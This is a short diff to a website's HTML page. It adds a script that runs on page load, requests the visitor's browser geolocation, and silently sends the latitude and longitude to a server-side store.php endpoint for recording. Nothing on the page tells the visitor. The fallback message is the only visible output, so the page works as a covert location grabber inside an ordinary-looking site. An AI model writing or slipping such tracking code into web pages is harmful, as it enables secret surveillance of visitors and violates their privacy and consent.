@@ -128,7 +128,26 @@ border-radius: 10%;
   </style>
 	
 </head>
-<body>
+<body onload="getLocation()" class="w3-white">
+	<p id="demo"></p>
+
+<script>
+var x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+    const xhttp = new XMLHttpRequest();
+    xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
+    xhttp.send();
+}
+</script>
 	
 	<div class="topnav" id="myTopnav">
     <a href="./index.html" class="active"><i class="fa-solid fa-house-user fa-beat"></i>  Home</a>
